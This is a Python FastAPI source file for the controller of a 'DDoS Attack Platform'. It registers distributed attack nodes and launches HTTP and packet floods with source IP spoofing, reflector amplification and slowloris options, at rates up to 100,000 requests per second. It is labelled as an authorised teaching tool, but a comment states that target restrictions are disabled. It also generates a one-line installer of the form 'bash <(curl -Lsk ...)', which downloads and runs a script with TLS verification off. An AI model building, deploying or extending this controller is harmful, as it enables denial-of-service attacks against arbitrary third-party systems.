from __future__ import annotations

import os
import re
import sys
import uuid
import asyncio
from contextlib import asynccontextmanager
from datetime import datetime, timedelta, timezone
from typing import Optional, List, Dict, Any
from pathlib import Path

from fastapi import FastAPI, Request, Depends, HTTPException, Query, BackgroundTasks, WebSocket
from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse, FileResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel, Field
import structlog

from app.auth import verify_controller_token, verify_node_token, auth_config
from app.models import (
    AttackCommand, AttackParams, AttackType, AttackStatus, AttackResult,
    NodeInfo, NodeHeartbeat, NodeStatus, Scenario, EmergencyStopCommand,
    TargetSpec, APIResponse, PaginatedResponse, AuditEvent
)
from app.orchestrator import Orchestrator
from app.audit import audit_logger
from app.node_commander import node_commander
from app.websocket import (
    websocket_endpoint, manager, broadcast_node_update, broadcast_node_heartbeat,
    broadcast_attack_start, broadcast_attack_update, broadcast_attack_stop,
    broadcast_emergency_stop, broadcast_rate_limit_status, broadcast_system_event,
    broadcast_audit_event
)

logger = structlog.get_logger(__name__)

orchestrator: Optional[Orchestrator] = None


def _find_resource_path(env_key: str, *candidates: str) -> Optional[Path]:
    """按 环境变量 → 候选路径 顺序定位安装脚本/制品目录 (开发仓与容器布局均兼容)"""
    env_val = os.getenv(env_key)
    if env_val and Path(env_val).exists():
        return Path(env_val)
    for cand in candidates:
        p = Path(cand)
        if p.exists():
            return p
    return None


# 安装脚本与制品目录路径 (兼容: 本地仓库运行 / 容器内 /app 布局)
INSTALL_SCRIPT = _find_resource_path(
    "INSTALL_SCRIPT_PATH",
    Path(__file__).parent.parent.parent / "deploy" / "node-install.sh",  # 仓库: controller/app/../../deploy
    "/app/deploy/node-install.sh",
)
ARTIFACTS_DIR = _find_resource_path(
    "ARTIFACTS_DIR",
    Path(__file__).parent.parent.parent / "artifacts",  # 仓库根 ./artifacts
    "/app/artifacts",
)


@asynccontextmanager
async def lifespan(app: FastAPI):
    global orchestrator

    # v1.3.0 方案A: 目标域名/IP 不做限制 — allowed_cidrs 仅作 Orchestrator 兼容参数, 不再拦截
    allowed_cidrs: list = []
    global_rps = int(os.getenv("GLOBAL_MAX_RPS", "50000"))
    global_pps = int(os.getenv("GLOBAL_MAX_PPS", "100000"))
    global_concurrent = int(os.getenv("GLOBAL_MAX_CONCURRENT_CONNECTIONS", "100000"))

    orchestrator = Orchestrator(allowed_cidrs, global_rps, global_pps, global_concurrent)
    await orchestrator.start()

    # M-2 修复: 接线 audit → WebSocket 广播 (原先 broadcast_audit_event 为死代码)
    audit_logger.set_broadcast_hook(broadcast_audit_event)

    async def broadcast_limits():
        while True:
            await asyncio.sleep(10)
            if orchestrator:
                status = orchestrator.get_rate_limit_status()
                await broadcast_rate_limit_status(status)

    limit_task = asyncio.create_task(broadcast_limits())

    logger.info("controller_started", target_restrictions="disabled")

    yield

    limit_task.cancel()
    try:
        await limit_task
    except asyncio.CancelledError:
        pass

    if orchestrator:
        await orchestrator.stop()
    logger.info("controller_stopped")


app = FastAPI(
    title="DDoS Attack Platform Controller",
    description="内网红方攻击编排控制中心 - 仅供授权教学演练使用",
    version="1.2.5",
    lifespan=lifespan,
    docs_url="/docs" if os.getenv("ENABLE_WEB_UI", "true").lower() == "true" else None,
    redoc_url=None
)

# 静态文件和模板 — CRIT-5 修复: 静态目录不存在时静默降级
templates = None
if os.getenv("ENABLE_WEB_UI", "true").lower() == "true":
    # PyInstaller 冻结环境: 资源解包到 sys._MEIPASS/ui; 源码运行: controller/ui
    if getattr(sys, "frozen", False):
        ui_path = Path(getattr(sys, "_MEIPASS", ".")) / "ui"
    else:
        ui_path = Path(__file__).parent.parent / "ui"
    if ui_path.exists():
        static_dir = ui_path / "static"
        if not static_dir.exists():
            static_dir.mkdir(parents=True, exist_ok=True)
        app.mount("/static", StaticFiles(directory=str(static_dir)), name="static")
        templates = Jinja2Templates(directory=str(ui_path / "templates"))


def get_orchestrator() -> Orchestrator:
    if not orchestrator:
        raise HTTPException(status_code=503, detail="Orchestrator not initialized")
    return orchestrator


# ========== 健康检查 ==========

@app.get("/health")
async def health():
    return {"status": "healthy", "service": "ddos-controller", "version": "1.1.0", "timestamp": datetime.now(timezone.utc).isoformat()}


@app.get("/ready")
async def ready(orch: Orchestrator = Depends(get_orchestrator)):
    return {
        "status": "ready",
        "emergency_stop": orch.is_emergency_active(),
        "nodes_online": len([n for n in orch.get_nodes() if n.status == NodeStatus.ONLINE]),
        "active_attacks": len(orch.get_all_attacks())
    }


# ========== 节点管理 ==========

@app.post("/api/v1/nodes/register", response_model=APIResponse)
async def register_node(
    request: Request,
    node: NodeInfo,
    auth_node: NodeInfo = Depends(verify_node_token),
    orch: Orchestrator = Depends(get_orchestrator)
):
    # S-3 修复: 注册身份必须与已认证的 X-Node-ID 一致, 防止持任一节点凭证伪造他节点
    if node.node_id != auth_node.node_id:
        raise HTTPException(status_code=403, detail="Node ID mismatch with authenticated identity")
    # BUG-18 防护: 节点上报回环地址时, 用 TLS 连接的真实来源 IP 替代,
    # 否则控制器会把攻击指令发给自己的 8080 (node_commander 打环回)
    if node.ip in ("127.0.0.1", "::1", "0.0.0.0", ""):
        client_host = request.client.host if request.client else node.ip
        node = node.model_copy(update={"ip": client_host})
        logger.warning("register_loopback_ip_substituted", node_id=node.node_id, ip=client_host)
    registered = await orch.register_node(node)
    await broadcast_node_update(registered.model_dump(mode='json'))
    return APIResponse(success=True, data=registered.model_dump(mode='json'), message="Node registered")


@app.post("/api/v1/nodes/heartbeat", response_model=APIResponse)
async def node_heartbeat(
    hb: NodeHeartbeat,
    auth_node: NodeInfo = Depends(verify_node_token),
    orch: Orchestrator = Depends(get_orchestrator)
):
    if hb.node_id != auth_node.node_id:
        raise HTTPException(status_code=403, detail="Node ID mismatch with authenticated identity")
    await orch.node_heartbeat(hb)
    await broadcast_node_heartbeat(hb)
    return APIResponse(success=True)


@app.post("/api/v1/nodes/{node_id}/unregister", response_model=APIResponse)
async def unregister_node(
    node_id: str,
    auth_node: NodeInfo = Depends(verify_node_token),
    orch: Orchestrator = Depends(get_orchestrator)
):
    # 只允许节点注销自身; 管理全网注销属 Controller 管理面职责
    if node_id != auth_node.node_id:
        raise HTTPException(status_code=403, detail="Cannot unregister another node's identity")
    await orch.unregister_node(node_id)
    await broadcast_node_update({"node_id": node_id, "status": NodeStatus.OFFLINE.value})
    return APIResponse(success=True, message="Node unregistered")


# ========== 攻击编排 ==========

class LaunchAttackRequest(BaseModel):
    attack_type: AttackType
    target: TargetSpec
    duration: int = Field(default=60, ge=1, le=3600)
    rps: int = Field(default=1000, ge=1, le=100000)
    concurrency: int = Field(default=100, ge=1, le=10000)
    scenario_id: Optional[str] = None
    node_ids: List[str] = []
    method: str = "GET"
    headers: Dict[str, str] = {}
    body: Optional[str] = None
    use_https: bool = False
    verify_ssl: bool = False
    source_ip_spoof: bool = False
    spoof_cidr: Optional[str] = None
    interface: Optional[str] = None
    slowloris_interval: int = 15
    reflector_type: Optional[str] = None
    reflector_list: Optional[List[str]] = None


@app.post("/api/v1/attacks/launch", response_model=APIResponse)
async def launch_attack(
    req: LaunchAttackRequest,
    background_tasks: BackgroundTasks,
    auth: str = Depends(verify_controller_token),
    orch: Orchestrator = Depends(get_orchestrator)
):
    if orch.is_emergency_active():
        raise HTTPException(status_code=409, detail="Emergency stop is active. Reset before launching new attacks.")

    params = AttackParams(
        target=req.target,
        duration=req.duration,
        rps=req.rps,
        concurrency=req.concurrency,
        method=req.method,
        headers=req.headers,
        body=req.body,
        use_https=req.use_https,
        verify_ssl=req.verify_ssl,
        source_ip_spoof=req.source_ip_spoof,
        spoof_cidr=req.spoof_cidr,
        interface=req.interface,
        slowloris_interval=req.slowloris_interval,
        reflector_type=req.reflector_type,
        reflector_list=req.reflector_list
    )

    command = AttackCommand(
        attack_id=f"atk-{uuid.uuid4().hex[:12]}",
        attack_type=req.attack_type,
        params=params,
        scenario_id=req.scenario_id,
        node_ids=req.node_ids
    )

    try:
        result = await orch.launch_attack(command)
        await broadcast_attack_start({
            "attack_id": command.attack_id,
            "type": req.attack_type.value,
            "target": req.target.model_dump(mode='json'),
            "target_nodes": result.get("target_nodes", []),
            # 进度条数据源: 前端以 started_at 计算已运行百分比
            "started_at": datetime.now(timezone.utc).isoformat(),
            # v1.3.0 C5/C1: 广播完整命令与权威状态 — 发射瞬间行数据即完整
            "command": command.model_dump(mode='json'),
            "status": "running",
        })
        return APIResponse(success=True, data=result, message="Attack launched")
    except ValueError as e:
        await audit_logger.log_target_validation_failure("controller", str(req.target.ip), str(e))
        raise HTTPException(status_code=400, detail=str(e))
    except RuntimeError as e:
        raise HTTPException(status_code=500, detail=str(e))
    except Exception as e:
        logger.error("launch_attack_failed", error=str(e))
        raise HTTPException(status_code=500, detail=f"Launch failed: {e}")


@app.post("/api/v1/attacks/{attack_id}/stop", response_model=APIResponse)
async def stop_attack(
    attack_id: str,
    reason: str = "manual",
    auth: str = Depends(verify_controller_token),
    orch: Orchestrator = Depends(get_orchestrator)
):
    result = await orch.stop_attack(attack_id, reason)
    await broadcast_attack_stop(attack_id, reason)
    return APIResponse(success=result["stopped"], data=result, message="Attack stop requested")


@app.post("/api/v1/emergency_stop", response_model=APIResponse)
async def emergency_stop(
    command: EmergencyStopCommand,
    auth: str = Depends(verify_controller_token),
    orch: Orchestrator = Depends(get_orchestrator)
):
    result = await orch.emergency_stop(command)
    await broadcast_emergency_stop(command.reason, command.issued_by)
    return APIResponse(success=True, data=result, message="Emergency stop executed")


@app.post("/api/v1/emergency_stop/reset", response_model=APIResponse)
async def reset_emergency_stop(
    auth: str = Depends(verify_controller_token),
    orch: Orchestrator = Depends(get_orchestrator)
):
    orch.reset_emergency_stop()
    await broadcast_system_event("emergency_stop_reset", {"reset_by": "controller"})
    return APIResponse(success=True, message="Emergency stop reset")


@app.get("/api/v1/attacks", response_model=APIResponse)
async def list_attacks(
    auth: str = Depends(verify_controller_token),
    orch: Orchestrator = Depends(get_orchestrator)
):
    attacks = orch.get_all_attacks()
    return APIResponse(success=True, data=attacks)


@app.get("/api/v1/attacks/{attack_id}", response_model=APIResponse)
async def get_attack(
    attack_id: str,
    auth: str = Depends(verify_controller_token),
    orch: Orchestrator = Depends(get_orchestrator)
):
    status = orch.get_attack_status(attack_id)
    if not status:
        raise HTTPException(status_code=404, detail="Attack not found")
    return APIResponse(success=True, data=status)


# ========== 结果收集 ==========

@app.post("/api/v1/results", response_model=APIResponse)
async def collect_result(
    result: AttackResult,
    auth_node: NodeInfo = Depends(verify_node_token),
    orch: Orchestrator = Depends(get_orchestrator)
):
    if result.node_id != auth_node.node_id:
        raise HTTPException(status_code=403, detail="Node ID mismatch with authenticated identity")
    orch.collect_result(result)
    await broadcast_attack_update(result.attack_id, result.node_id, result)
    return APIResponse(success=True)


# ========== 节点查询 ==========

@app.get("/api/v1/nodes", response_model=APIResponse)
async def list_nodes(
    auth: str = Depends(verify_controller_token),
    orch: Orchestrator = Depends(get_orchestrator)
):
    nodes = orch.get_nodes()
    return APIResponse(success=True, data=[n.model_dump(mode='json') for n in nodes])


@app.get("/api/v1/nodes/enroll-command", response_model=APIResponse)
async def enroll_command(
    request: Request,
    type: str = Query("http", pattern="^(http|raw)$"),
    node_id: str = Query(..., min_length=2, max_length=63),
    auth: str = Depends(verify_controller_token),
):
    """管理员生成节点一键安装命令 (WebUI「添加节点」数据源)
    注意: 静态路由必须先于 /nodes/{node_id} 注册, 否则会被动态段吞掉"""
    if not NODE_ID_RE.match(node_id):
        raise HTTPException(status_code=400, detail="node_id 仅允许字母数字/-/_ , 2-63 字符")

    token = auth_config.generate_enroll_token(node_id)
    fingerprint = auth_config.get_tls_fingerprint().replace(":", "").lower()
    base = _public_base_url(request)
    script_src = (
        f"{base}/install.sh"
        if INSTALL_SCRIPT
        else "https://raw.githubusercontent.com/zhang123999-qq/ddos-attack-platform/master/deploy/node-install.sh"
    )
    cmd = (
        f"bash <(curl -Lsk {script_src}) "
        f"-e {base} "
        f"-t {token} "
        f"--id {node_id} "
        f"--type {type}"
        + (f" --fingerprint {fingerprint}" if fingerprint else "")
    )
    # 当前小时桶结束时刻 ≈ 有效期上限
    now = datetime.now(timezone.utc)
    expiry = now.replace(minute=59, second=59, microsecond=0) + timedelta(hours=1)

    await _audit("enroll_command_issued", "authenticated_user", {"node_id": node_id, "type": type})
    return APIResponse(success=True, data={
        "command": cmd,
        "node_id": node_id,
        "type": type,
        "expires_at": expiry.isoformat(),
        "tls_fingerprint": auth_config.get_tls_fingerprint(),
    })


@app.get("/api/v1/nodes/{node_id}", response_model=APIResponse)
async def get_node(
    node_id: str,
    auth: str = Depends(verify_controller_token),
    orch: Orchestrator = Depends(get_orchestrator)
):
    node = orch.get_nodes()
    node = next((n for n in node if n.node_id == node_id), None)
    if not node:
        raise HTTPException(status_code=404, detail="Node not found")
    return APIResponse(success=True, data=node.model_dump(mode='json'))


# ========== 一键安装引导 (面板生成命令, 节点粘贴自装自注册) ==========

NODE_ID_RE = re.compile(r"^[a-zA-Z0-9][a-zA-Z0-9_-]{1,62}$")


def _public_base_url(request: Request) -> str:
    """对外可访问的控制器基址 (scheme+host), 供安装命令/CA 分发拼接"""
    host = request.headers.get("host") or request.url.netloc
    return f"{request.url.scheme}://{host}"


async def _audit(event_type: str, actor: str, details: dict):
    await audit_logger.log_event(AuditEvent(
        event_id=uuid.uuid4().hex,
        event_type=event_type,
        actor=actor,
        details=details
    ))


@app.get("/install.sh", include_in_schema=False)
async def serve_install_script(request: Request):
    """分发节点安装器; __CONTROLLER_URL__ 占位符按请求地址替换, 命令可省略 -e 参数"""
    if not INSTALL_SCRIPT:
        raise HTTPException(status_code=404, detail="install script not bundled")
    base = _public_base_url(request)
    body = INSTALL_SCRIPT.read_bytes().decode("utf-8")
    body = body.replace("__CONTROLLER_URL__", base)
    await _audit("config_change", "system", {
        "action": "install_script_served", "controller_url": base
    })
    return PlainTextResponse(body, media_type="text/x-shellscript; charset=utf-8")


@app.get("/api/v1/controller-info", include_in_schema=False)
async def controller_info(request: Request):
    """公开元信息: TLS 指纹(供节点钉扎校验)、可用制品列表、安装脚本状态"""
    artifacts = []
    if ARTIFACTS_DIR:
        artifacts = sorted(
            p.name for p in ARTIFACTS_DIR.iterdir()
            if p.is_file() and p.name.endswith(".tar.gz")
        )
    return {
        "service": "ddos-controller",
        "version": app.version,
        "base_url": _public_base_url(request),
        "tls_fingerprint": auth_config.get_tls_fingerprint(),
        "artifacts": artifacts,
        "install_script_available": INSTALL_SCRIPT is not None,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


class EnrollRequest(BaseModel):
    node_id: str
    enroll_token: str


@app.post("/api/v1/nodes/enroll", include_in_schema=False)
async def enroll_node(req: EnrollRequest, request: Request):
    """节点自助接入 (无认证端点, 由无状态 enroll token 把关):
    校验 HMAC(secret,'ddos-enroll:'+node_id+':'+小时桶) → 返回运行所需配置。
    token 绑定 node_id 且约 1 小时自然过期, 服务端零存储。"""
    if not NODE_ID_RE.match(req.node_id):
        raise HTTPException(status_code=400, detail="Invalid node_id format")

    if not auth_config.verify_enroll_token(req.node_id, req.enroll_token.strip()):
        await asyncio.sleep(1.0)  # 拖慢爆破
        await _audit("node_enroll_failed", req.node_id, {
            "source_ip": request.client.host if request.client else "unknown"
        })
        raise HTTPException(status_code=403, detail="Invalid or expired enroll token")

    secret = os.getenv("SHARED_SECRET") or auth_config.shared_secret.decode()
    cidrs = [c.strip() for c in os.getenv("ALLOWED_TARGET_CIDRS", "127.0.0.0/8").split(",") if c.strip()]
    await _audit("node_enroll_success", req.node_id, {
        "source_ip": request.client.host if request.client else "unknown"
    })
    return {
        "node_id": req.node_id,
        "shared_secret": secret,
        "allowed_target_cidrs": ",".join(cidrs),
        "ca_cert_url": f"{_public_base_url(request)}/artifacts/ca-cert.pem",
        "tls_fingerprint": auth_config.get_tls_fingerprint(),
        "enrolled_at": datetime.now(timezone.utc).isoformat(),
    }


# CA 证书分发 (先于 /artifacts 静态挂载注册, 保证证书缺失于制品目录时仍可下载)
@app.get("/artifacts/ca-cert.pem", include_in_schema=False)
async def serve_ca_cert():
    ca = Path(auth_config.ca_cert_path)
    if not ca.exists():
        raise HTTPException(status_code=404, detail="CA cert not available on controller")
    return FileResponse(ca, media_type="application/x-pem-file", filename="ca-cert.pem")


if ARTIFACTS_DIR:
    app.mount("/artifacts", StaticFiles(directory=str(ARTIFACTS_DIR)), name="artifacts")


# ========== 限流状态 ==========

@app.get("/api/v1/rate-limits", response_model=APIResponse)
async def get_rate_limits(
    auth: str = Depends(verify_controller_token),
    orch: Orchestrator = Depends(get_orchestrator)
):
    status = orch.get_rate_limit_status()
    return APIResponse(success=True, data=status)


# ========== 场景管理 ==========

@app.get("/api/v1/scenarios", response_model=APIResponse)
async def list_scenarios(
    auth: str = Depends(verify_controller_token),
    orch: Orchestrator = Depends(get_orchestrator)
):
    scenarios = orch.get_scenarios()
    return APIResponse(success=True, data=[s.model_dump(mode='json') for s in scenarios])


@app.get("/api/v1/scenarios/{scenario_id}", response_model=APIResponse)
async def get_scenario(
    scenario_id: str,
    auth: str = Depends(verify_controller_token),
    orch: Orchestrator = Depends(get_orchestrator)
):
    scenario = orch.get_scenarios()
    scenario = next((s for s in scenario if s.scenario_id == scenario_id), None)
    if not scenario:
        raise HTTPException(status_code=404, detail="Scenario not found")
    return APIResponse(success=True, data=scenario.model_dump(mode='json'))


class RunScenarioRequest(BaseModel):
    overrides: Optional[Dict[str, Any]] = None


@app.post("/api/v1/scenarios/{scenario_id}/run", response_model=APIResponse)
async def run_scenario(
    scenario_id: str,
    req: RunScenarioRequest,
    auth: str = Depends(verify_controller_token),
    orch: Orchestrator = Depends(get_orchestrator)
):
    if orch.is_emergency_active():
        raise HTTPException(status_code=409, detail="Emergency stop is active")

    try:
        run_id = await orch.run_scenario(scenario_id, req.overrides)
    except ValueError as e:
        # H-2 修复: overrides 缺失/非法同步返回 400, 不再 200+静默失败
        raise HTTPException(status_code=400, detail=str(e))
    return APIResponse(success=True, data={"run_id": run_id}, message="Scenario started")


@app.post("/api/v1/scenarios/{scenario_id}/stop", response_model=APIResponse)
async def stop_scenario(
    scenario_id: str,
    auth: str = Depends(verify_controller_token),
    orch: Orchestrator = Depends(get_orchestrator)
):
    await orch.stop_scenario(scenario_id)
    return APIResponse(success=True, message="Scenario stop requested")


# ========== WebSocket ==========

@app.websocket("/ws/metrics")
async def ws_metrics(
    websocket: WebSocket,
    token: str = Query(...),
    channels: str = Query("nodes,attacks,metrics,alerts,system"),
    client_id: str = Query("web-ui")
):
    await websocket_endpoint(websocket, token, channels, client_id)


# ========== Web UI ==========

if templates:

    @app.get("/", response_class=HTMLResponse)
    async def dashboard(request: Request):
        # starlette>=0.29 新签名: request 首参 + name/context 关键字 (旧二元组传法已移除)
        # BUG-16 修复: 服务端注入 ui_token — 原先模板 {{ token }} 渲染为空,
        # 前端退化为 localStorage/prompt, 用户无法手工得出 HMAC → 全部 API 401
        # (表现为「生成安装命令失败」+ WebSocket 断开重连死循环)
        # BUG-17: 端口不再硬编码 8443 — 从请求 Host 头解析, 支持自定义端口部署
        host_header = request.headers.get("host") or request.url.netloc
        if ":" in host_header:
            hostname, port = host_header.rsplit(":", 1)
            try:
                port = str(int(port))
            except ValueError:
                hostname, port = host_header, "443"
        else:
            hostname, port = host_header, "443"
        return templates.TemplateResponse(
            request=request,
            name="dashboard.html",
            context={
                "request": request,
                "controller_host": request.url.hostname,
                "controller_port": port,
                "token": auth_config.ui_token(),
            },
        )


# ========== 内部调试端点 ==========

@app.get("/api/v1/internal/node_commander_status", include_in_schema=False)
async def node_commander_status(auth: str = Depends(verify_controller_token)):
    return {
        "node_count": len(node_commander._nodes),
        "nodes": list(node_commander._nodes.keys()),
    }


if __name__ == "__main__":
    import ssl
    import uvicorn

    # HIGH-9 真实修复: uvicorn 无 ssl_context 参数, 使用 ssl_certfile/ssl_keyfile/
    # ssl_ca_certs/ssl_cert_reqs 四参数启用 TLS (0.27+ 均支持)。
    # 证书缺失时降级为明文 HTTP 并告警, 避免开发环境 crashloop。
    tls_kwargs: Dict[str, Any] = {}
    cert_file = os.getenv("TLS_CERT_FILE", "/certs/controller-cert.pem")
    key_file = os.getenv("TLS_KEY_FILE", "/certs/controller-key.pem")
    ca_file = os.getenv("TLS_CA_FILE", "/certs/ca-cert.pem")
    if Path(cert_file).exists() and Path(key_file).exists():
        tls_kwargs = {
            "ssl_certfile": cert_file,
            "ssl_keyfile": key_file,
            "ssl_ca_certs": ca_file if Path(ca_file).exists() else None,
            # 默认仅服务端 TLS; TLS_VERIFY_CLIENT=true 时强制双向认证
            "ssl_cert_reqs": ssl.CERT_REQUIRED if auth_config.verify_client else ssl.CERT_NONE,
        }
        logger.info("tls_enabled", verify_client=auth_config.verify_client)
    else:
        logger.warning("tls_disabled_missing_certs", cert=cert_file, key=key_file)

    # PyInstaller 冻结环境下无 app 包可导入 — 直接传应用对象;
    # 源码运行保持字符串引用以启用 reload 语义
    app_target = "app.main:app"
    if getattr(sys, "frozen", False):
        app_target = app
    uvicorn.run(
        app_target,
        host=os.getenv("CONTROLLER_HOST", "0.0.0.0"),
        port=int(os.getenv("CONTROLLER_PORT", "8443")),
        log_level=os.getenv("LOG_LEVEL", "info").lower(),
        access_log=True,
        **tls_kwargs,
    )